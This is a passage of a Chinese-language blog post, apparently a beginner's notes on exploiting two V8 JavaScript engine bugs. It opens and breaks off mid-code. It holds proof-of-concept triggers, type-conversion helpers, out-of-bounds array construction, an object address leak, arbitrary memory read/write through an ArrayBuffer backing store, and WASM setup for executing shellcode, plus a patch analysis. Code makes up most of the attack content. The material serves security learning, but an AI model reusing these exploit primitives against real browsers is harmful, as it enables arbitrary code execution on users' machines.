class="keyword">let</span> i = <span class="number">8</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">  assertEquals(<span class="literal">undefined</span>, a2[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pwndbg调试<code>./d8 --allow-natives-syntax poc.js</code>，发现这个POC确实溢出了，a2长度变为了65536。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>可以发现a2溢出了很多，所以一切都比较好控制。基本思路是<code>数组越界 -&gt; 类型混淆 -&gt; 泄漏对象、任意地址读写 -&gt; 利用WASM执行shellcode</code>。</p><h4 id="定义类型转换工具函数"><a href="#定义类型转换工具函数" class="headerlink" title="定义类型转换工具函数"></a>定义类型转换工具函数</h4><p>在V8中，number有两种形式，一种是float，一种是smi(small int)，（还有比较新的bigint任意精度整数类型）。为方便使用，需要写一些方法用于转换数据类型，这个依我入门新手的经验来看，是一般exp都需要的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*---------------------------datatype convert-------------------------*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">typeConvert</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.buf   = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64   = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32   = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// convert float to int</span></span><br><span class="line">    f2i(val) &#123;</span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        convert int to float</span></span><br><span class="line"><span class="comment">        if nead convert a 64bits int to float</span></span><br><span class="line"><span class="comment">        please use string like "deadbeefdeadbeef"</span></span><br><span class="line"><span class="comment">        (v8's SMI just use 56bits, lowest 8bits is zero as flag)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    i2f(val) &#123;</span><br><span class="line">        <span class="keyword">let</span> vall = hex(val);</span><br><span class="line">        <span class="keyword">let</span> tmp  = [];</span><br><span class="line">        tmp[<span class="number">0</span>]   = vall.slice(<span class="number">10</span>, );</span><br><span class="line">        tmp[<span class="number">1</span>]   = vall.slice(<span class="number">2</span>, <span class="number">10</span>);</span><br><span class="line">        tmp[<span class="number">0</span>]   = <span class="built_in">parseInt</span>(tmp[<span class="number">0</span>], <span class="number">16</span>);</span><br><span class="line">        <span class="comment">// console.log(hex(val));</span></span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>(tmp[<span class="number">1</span>], <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//convert number to hex string</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dt = <span class="keyword">new</span> typeConvert();</span><br></pre></td></tr></table></figure><h4 id="获得越界数组"><a href="#获得越界数组" class="headerlink" title="获得越界数组"></a>获得越界数组</h4><p>仿照POC那么做，弄一个可以越界的数组：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*---------------------------get oob array-------------------------*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="built_in">arguments</span>.length;</span><br><span class="line">    a1    = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">    a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">    a2    = [<span class="number">1.1</span>];</span><br><span class="line">    a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">26</span>] = <span class="number">1.39064994160909e-309</span>;  <span class="comment">// 0xffff00000000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a1, a2;</span><br><span class="line"><span class="keyword">var</span> a3 = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">a3.length = <span class="number">0x10000</span></span><br><span class="line">fun(<span class="number">1</span>);</span><br><span class="line">fun(<span class="number">1</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(fun);</span><br><span class="line">fun(...a3); <span class="comment">// "..." convert array to arguments list</span></span><br><span class="line"><span class="comment">// now, I have an oobArray : a2</span></span><br></pre></td></tr></table></figure><h4 id="泄漏对象地址"><a href="#泄漏对象地址" class="headerlink" title="泄漏对象地址"></a>泄漏对象地址</h4><p>这个也好做，像下面的做法，把要泄露的objTest，赋值给objLeak.leak，然后在a2（溢出数组）里搜0xdead，找到了-1就是要泄露的地址。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*---------------------------leak object-------------------------*/</span></span><br><span class="line"><span class="keyword">var</span> objLeak = &#123;<span class="string">'leak'</span> : <span class="number">0x1234</span>, <span class="string">'tag'</span> : <span class="number">0xdead</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objTest = &#123;<span class="string">'a'</span>:<span class="string">'b'</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//search the objLeak.tag</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffff</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dt.f2i(a2[i]) == <span class="number">0xdead00000000</span>) &#123;</span><br><span class="line">        offset1 = i - <span class="number">1</span>; <span class="comment">//a2[offset1] -&gt; objLeak.leak</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>) </span>&#123;</span><br><span class="line">    objLeak.leak = target;</span><br><span class="line">    <span class="keyword">let</span> leak = dt.f2i(a2[offset1]);</span><br><span class="line">    <span class="keyword">return</span> leak;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"address of objTest : "</span> + hex(addressOf(objTest)));</span><br><span class="line">%DebugPrint(objTest);</span><br></pre></td></tr></table></figure><h4 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h4><p>定义一个ArrayBuffer，长度是0xbeef，然后在数组里找到它，然后就能获得ArrayBuffer.backing_store，就是要这个ArrayBuffer.backing_store，覆写它为target_addr，就能往target_addr里写东西了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*---------------------------arbitrary read and write-------------------------*/</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xbeef</span>);</span><br><span class="line"><span class="keyword">var</span> offset2;</span><br><span class="line"><span class="keyword">var</span> dtView = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//search the buf.size</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffff</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(dt.f2i(a2[i]) == <span class="number">0xbeef</span>) &#123;</span><br><span class="line">        offset2 = i + <span class="number">1</span>; <span class="comment">//a2[offset2] -&gt; buf.backing_store</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">    a2[offset2] = dt.i2f(addr);</span><br><span class="line">    dtView.setFloat64(<span class="number">0</span>, dt.i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr, str=false</span>) </span>&#123;</span><br><span class="line">    a2[offset2] = dt.i2f(addr);</span><br><span class="line">    <span class="keyword">let</span> tmp    = [<span class="string">''</span>, <span class="string">''</span>];</span><br><span class="line">    <span class="keyword">let</span> tmp2   = [<span class="string">''</span>, <span class="string">''</span>];</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">''</span></span><br><span class="line">    tmp[<span class="number">1</span>] = hex(dtView.getUint32(<span class="number">0</span>)).slice(<span class="number">10</span>,);</span><br><span class="line">    tmp[<span class="number">0</span>] = hex(dtView.getUint32(<span class="number">4</span>)).slice(<span class="number">10</span>,);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        tmp2[<span class="number">0</span>] += tmp[<span class="number">0</span>].slice(i * <span class="number">2</span>, i * <span class="number">2</span> + <span class="number">2</span>);</span><br><span class="line">        tmp2[<span class="number">1</span>] += tmp[<span class="number">1</span>].slice(i * <span class="number">2</span>, i * <span class="number">2</span> + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = tmp2[<span class="number">0</span>] + tmp2[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (str == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'0x'</span> + result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">parseInt</span>(result, <span class="number">16</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test</span></span><br><span class="line">write64(addressOf(objTest) + <span class="number">0x18</span> - <span class="number">1</span>, <span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'read in objTest + 0x18 : '</span> + hex(read64(addressOf(objTest) + <span class="number">0x18</span> - <span class="number">1</span>)));</span><br><span class="line">%DebugPrint(objTest);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><h4 id="利用WASM执行shellcode"><a href="#利用WASM执行shellcode" class="headerlink" title="利用WASM执行shellcode"></a>利用WASM执行shellcode</h4><p>没看懂。怎么就获得一块rwx内存然后执行它了，为什么一定要任意读写，直接造一块不行嘛。</p><p>我们实例化一个wasm的对象funcAsm，通过读取前面控制的JSArrayBuffer的内容可以得到funcAsm的地址。funcAsm实际上是一个JSFunction类型的对象，实际执行的代码位于一块rwx的内存中，通过任意地址写修改这块rwx内存的内容再调用funcAsm就可以执行任意代码了。</p><p>看来这块rwx内存的内容我们正常手段控制不了，害。我是沙笔，v8是沙箱还容得我任意瞎j执行？</p><p>这样找那块内存<code>wasmInstance.exports.main -&gt; shared_info -&gt; data -&gt; instance+0xe8</code>，一路调试找一下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">10</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(f);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>TODO: 谁能告诉我那坨wasmCode是什么东西???</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p><a href="https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04%5E!" target="_blank" rel="noopener">google官方的patch</a></p><p>没看太懂（呲牙），因为没分析成因。</p><h2 id="v8-利用入门-从越界访问到-rce"><a href="#v8-利用入门-从越界访问到-rce" class="headerlink" title="v8 利用入门-从越界访问到 rce"></a>v8 利用入门-从越界访问到 rce</h2><p><a href="https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/" target="_blank" rel="noopener">https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/</a></p><p><a href="https://paper.seebug.org/1145/" target="_blank" rel="noopener">https://paper.seebug.org/1145/</a></p><h3 id="官方POC"><a href="#官方POC" class="headerlink" title="官方POC"></a>官方POC</h3><p>官方POC如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oobArray = [];</span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (&#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">            oobArray.length = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)&#125;);</span><br><span class="line">oobArray[oobArray.length - <span class="number">1</span>] = <span class="number">0x41414141</span>;</span><br></pre></td></tr></table></figure><p>debug版执行这段code的时候，v8会崩；release版直接越界操作。</p><h3 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h3><p>oobArray的length与elements的length不一样，证明v8处理length的时候有问题。调试可见elements已经是一个空数组了，而oobArray的长度还是迭代器返回的。</p><p>具体代码不分析了，直接对着patch RTFSC就行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    TNode&lt;JSArray&gt; fast_array = CAST(array);</span><br><span class="line"></span><br><span class="line">    TNode&lt;Smi&gt; length_smi = CAST(length);  <span class="comment">//length_smi=length=8224</span></span><br><span class="line">    TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array);<span class="comment">//old_length=array.length=0</span></span><br><span class="line">    CSA_ASSERT(<span class="keyword">this</span>, TaggedIsPositiveSmi(old_length));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) Ensure that the length is writable.</span></span><br><span class="line">    <span class="comment">// TODO(delphick): This check may be redundant due to the</span></span><br><span class="line">    <span class="comment">// BranchIfFastJSArray above.</span></span><br><span class="line">    EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime); <span class="comment">//确认length字段可写</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) If the created array already has a length greater than required,</span></span><br><span class="line">    <span class="comment">//    then use the runtime to set the property as that will insert holes</span></span><br><span class="line">    <span class="comment">//    into the excess elements and/or shrink the backing store.</span></span><br><span class="line">    <span class="comment">// 如果length_smi &lt; old_length则执行runtime以length_smi为准重新设置elements和length</span></span><br><span class="line">    GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个函数应该就是patch注释中说的"fast set"方式</span></span><br><span class="line">    <span class="comment">// 往array的length字段写入length_smi(8224)，却没有设置elements为相应大小的数组</span></span><br><span class="line">    StoreObjectFieldNoWriteBarrier(fast_array, <span class="attr">JSArray</span>::kLengthOffset,</span><br><span class="line">                                    length_smi);</span><br><span class="line"></span><br><span class="line">    Goto(&amp;done);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个runtime应该是一个比较稳妥的设置方式，会同步设置elements和length</span></span><br><span class="line">BIND(&amp;runtime);</span><br><span class="line">&#123;</span><br><span class="line">    CallRuntime(Runtime::kSetProperty, context, static_cast&lt;Node*&gt;(array),</span><br><span class="line">                CodeStubAssembler::LengthStringConstant(), length,</span><br><span class="line">                SmiConstant(LanguageMode::kStrict));</span><br><span class="line">    Goto(&amp;done);</span><br><span class="line">&#125;</span><br><span class="line">BIND(&amp;done);</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>跟上面差不多。</p><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>还是要一个ArrayBuffer，控制它的backing_store。</p><p>这里需要JSArrayBuffer落到一个释放的oobArray里，因为这里是数组先分配了，再把长度改短了，gc还没回收呢，别的对象分配不上去，所以要触发gc。触发gc可以通过删除对象引用实现，需要注意的一点是为了避免oobArray被gc完全回收，在最后一轮迭代后要设置oobArray.length为大于0的数如1。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* generate a Out-Of-Bound array and generate many ArrayBuffers and objects */</span></span><br><span class="line"><span class="keyword">var</span> bufArray = [];</span><br><span class="line"><span class="keyword">var</span> objArray = [];</span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">8224</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objGen</span>(<span class="params">tag</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.leak = <span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">this</span>.tag = tag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">x</span> =&gt;</span> (&#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="number">1.1</span>;</span><br><span class="line">        <span class="keyword">this</span>.counter++;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">            oobArray.length = <span class="number">1</span>;</span><br><span class="line">            bufArray.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xbeef</span>));</span><br><span class="line">            objArray.push(<span class="keyword">new</span> objGen(<span class="number">0xdead</span>));</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> x = <span class="number">0</span>; x &lt;= maxSize; x++) &#123;</span><br><span class="line">    <span class="keyword">let</span> y = oobArray[x]</span><br><span class="line">&#125;; <span class="comment">//trigger the GC</span></span><br></pre></td></tr></table></figure><h4 id="泄露内存地址"><a href="#泄露内存地址" class="headerlink" title="泄露内存地址"></a>泄露内存地址</h4><p>落进去以后，就通过标记来找到它。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxSize; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> val = dt.f2i(oobArray[i]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0xbeef00000000</span> === val) &#123;</span><br><span class="line">        offsetBuf = i - <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"buf offset: "</span> + offsetBuf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0xdead00000000</span> === val) &#123;</span><br><span class="line">        offsetObjLeak = i - <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"objGen.leak offset: "</span> + offsetObjLeak);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用wasm执行任意代码"><a href="#利用wasm执行任意代码" class="headerlink" title="利用wasm执行任意代码"></a>利用wasm执行任意代码</h4><p>这个跟上面套路一模一样了。</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p>代码来源<a href="https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/" target="_blank" rel="noopener">https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 